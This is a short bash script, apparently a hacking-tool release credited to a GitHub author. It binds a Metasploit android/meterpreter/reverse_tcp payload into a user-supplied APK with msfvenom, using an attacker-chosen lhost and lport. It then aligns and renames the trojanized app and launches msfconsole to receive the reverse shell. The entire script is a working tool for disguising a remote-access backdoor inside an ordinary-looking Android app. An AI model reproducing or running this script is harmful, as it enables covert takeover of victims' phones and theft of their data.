#Author - github.com/kinghacker0
#Credit - Give me credit if you use any part of script

#Banner Start
echo -e "    ___        __       ___  _         __    "
echo -e "   / _ | ___  / /______/ _ )(_)__  ___/ /__ ____ "
echo -e "  / __ |/ _ \/  '_/___/ _  / / _ \/ _  / -_) __/  "
echo -e " /_/ |_/ .__/_/\_\   /____/_/_//_/\_,_/\__/_/     "
echo -e "      /_/                                       "
echo -e " Author  = github.com/kinghacker0               "
echo -e "\e[34m Website = hackersking.in              \e[0m "
echo -e "\e[49m                                 \e[2m"

#Bind Backdoor
read -p "[*]Enter filepath of apk#~: " path
read -p "[*]Enter output payload name#~: " payload
read -p "[*]Enter lhost#~: " lhost
read -p "[*]Enter lport#~: " lport
echo -e "\e[31m[*]Reverse Engineering Started..;p\e[0m"
msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> binded.apk

#Signing the apk
echo "\e[31m                                                   \e[2m"
echo -e " [-]signing the apk                             "
zipalign -v 4 binded.apk binded-signed.apk

#listner start
rm binded.apk && mv binded-signed.apk $payload.apk
echo "                                                "
read -p "\e[34m[-]Start listner(Enter) or Close (Ctrl+c) : \e[2m" listner
msfconsole
#Changing this banner doesn't make you programmer..!"
